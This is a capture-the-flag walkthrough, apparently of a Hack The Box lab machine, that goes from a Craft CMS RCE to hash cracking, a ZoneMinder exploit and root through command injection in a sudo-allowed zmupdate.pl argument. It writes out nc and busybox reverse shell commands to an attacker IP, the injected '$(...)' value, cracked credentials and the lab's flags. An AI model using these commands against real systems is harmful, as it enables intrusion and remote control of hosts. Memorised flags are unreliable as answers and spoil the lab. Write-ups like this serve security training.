![[Surveillance.png]]
# Reconnaissance
1. `curl -I 10.10.11.245` to find a possible DNS name, and i found `surveillance.htb` add it to `/etc/hosts`
2. scanning discover a `/admin` which lead to `/admin/login`
3. system is running `craft CMS` version unknown, but there's a recent discovery of RCE, details can be found here `https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226`

# User Escalation
1. based on the POC, `python3 craftcms-cve.py http://surveillance.htb` to send the payload
3. and i got a shell, but it behave weirdly, so i tried a way to get a reverse shell from it, by utilizing this payload `rm /tmp/nuts;mkfifo /tmp/nuts;cat /tmp/nuts|/bin/sh -i 2>&1|nc your-ip port >/tmp/nuts` borrowed from `https://gist.github.com/sckalath/67a59eb4955f1f9aedde`
4. before executing the command, setup an nc listener `nc -lvnp port`
5. after executing the command i got a reverse shell in nc which us way much more stable and interactive
6. the initial connection put me in `/var/www/html/craft/web/cpresources` and i notice something interesting in `/var/www/html/craft/storage/backups`, there's a `surveillance--2023-10-17-202801--v4.4.14.sql.zip` backup file in the form of zip, moved it to my local
7. once the file is on my local machine i unzip the file and given an SQL file
8. then i import the SQL via xampp databases (reading the SQL code is fine too)
9. after importing there's a bunch of tables, and the most interesting is the `users` table, which inside has only 1 credentials, which is `matthew` with a hashed password
10. move the hash into a new file `matthew.hash`, `hashid matthew.hash` return a list of possible hash, and it looks like a `SHA-256` which is `1400` in hashcat, i crack the password with `rockyou.txt`
11. `hashcat -m 1400 matthew.hash rockyou.txt` return a password of `starcraft122490` acquiring the credentials of `matthew:starcraft122490` for the SSH connection
12. `ssh matthew@surveillance.htb`, if there's a prompt just `yes`, and input the password
13. once i'm in `cat user.txt`
14. flag: `b70fcdf7a34088d0ecdf2e9713735f1b`

# Further Reconnaissance
1. `sudo -l` this user isn't allowed to run any sudo command
2. find any exploitable binary in `/bin`, `/usr/sbin`, `/usr/bin`, found none
3. moving and running `linpeas.sh` to find any possible privesc path or an insecure config, i found another user named `zoneminder`. which turns out to be an open-source surveillance software (although this step could be done with `ls /home`).
4. during the scans the user `zoneminder` password is exposed in the file `/usr/share/zoneminder/www/api/app/Config/database.php` which is `ZoneMinderPassword2023`
	1. `grep /usr/share/zoneminder/www/api/app/Config | grep -i "version"`, returns that the zoneminder is running on version `1.36.32`
5. `netstat -nltp` return a list of currently open port, which i find something interesting running on port 8080

# zoneminder Escalation
1. since i know that there's a user and a service called zoneminder, and there's open port 8080 which running on localhost, i decided to access it with ssh port forwarding based on this `https://serverfault.com/questions/1004529/access-an-http-server-as-localhost-from-an-external-pc-over-ssh` which i come with the payload of `ssh -L 9999:localhost:8080 matthew@surveillance.htb`
2. upon running the command, when i was prompted back in the SSH it means i have completed the port forwarding process, and now i could access the page by visiting `127.0.0.1:9999` on the browser
3. with previous version of zoneminder known, i found this POC `https://github.com/heapbytes/CVE-2023-26035`
4. once the login page is accessible, setup an nc listener `nc your-ip port`
5. then run the payload `python3 epxloit.py --target http://target.url --cmd 'command'`, i use the reverse shell command on the user escalation part `rm /tmp/nuts;mkfifo /tmp/nuts;cat /tmp/nuts|/bin/sh -i 2>&1|nc your-ip port >/tmp/nuts` and check for the connection in the nc listener
6. since this is an unstable shell, securing the robust one could use a simple python (if available) `python3 -c "import pty; pty.spawn('/bin/bash')"`

# Privilege Escalation
1.  once logged in as zoneminder do `sudo -l`, and it turns out that this user could run a script in this regex pattern as sudo `/usr/bin/zm[a-zA-Z]*.pl`
2. which then i list all available binary with `ls /usr/bin | grep -E '^zm[a-zA-Z_]+\.pl$'` which return a list of zm script
3. after some tweaking with the machine, i notice that this script accepts file as the `--user` parameter which then i could run a script as sudo
4. nc is available on the target hosts, create a simple reverse shell script with the content
```sh
#!/bin/bash
busybox nc 10.10.14.70 9099 -e sh
```
i find the normal nc doesn't work with -e so i choose to use the busybox version
1. `chmod +x rev.sh` to make it executable
2. then setup nc listener on my local machine `nc -lvnp port`
3. trigger the zmupdate script `sudo zmupdate.pl --version=1 --user='$(/tmp/nuts2/rev.sh)' --pass=ZoneMinderPassword2023`
4. enter on the first prompt, and `n` on the next prompt, then it will load for a long time, check for any connection on the nc listener, if on the script i use `sh` it wont show any sign such as `$`, but using `bash` will show the sign, use `id` to identify if i'm on the system, which i have gain access as root, or i could secure a stable shell with a python command `python3 -c "import pty; pty.spawn('/bin/bash')"`
5. which now im logged in as root `cat /root/root.txt`
6. flag: `0ac5f5d00aa4725f99625aad9dd398bb`

![[Surveillance-Pwned.png]]
